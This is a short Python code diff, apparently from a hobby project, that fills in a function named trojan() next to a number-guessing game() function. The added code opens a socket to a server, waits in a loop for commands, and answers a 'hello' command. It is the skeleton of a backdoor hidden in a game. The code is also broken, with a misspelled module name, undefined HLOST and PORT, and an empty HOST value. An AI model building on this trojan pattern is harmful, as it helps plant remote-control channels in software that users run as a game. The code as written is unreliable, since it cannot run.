@@ -7,7 +7,13 @@ def trojan():
     HOST = 
     port = 9090
 
-    client = socket
+    client = socket.socket(socker.AF_INET,socket.SOCK_STREAM)
+    client.connect((HLOST,PORT))
+    while True:
+        server_command = client.recv(1024).decode('utf-8')
+        if server_command == 'hello':
+            print("hello World!")
+            client.send(f"{server_command} was executed successfully".encode('utf-8'))
 def game():
     number = random.randint(0,1000)
     tries = 1
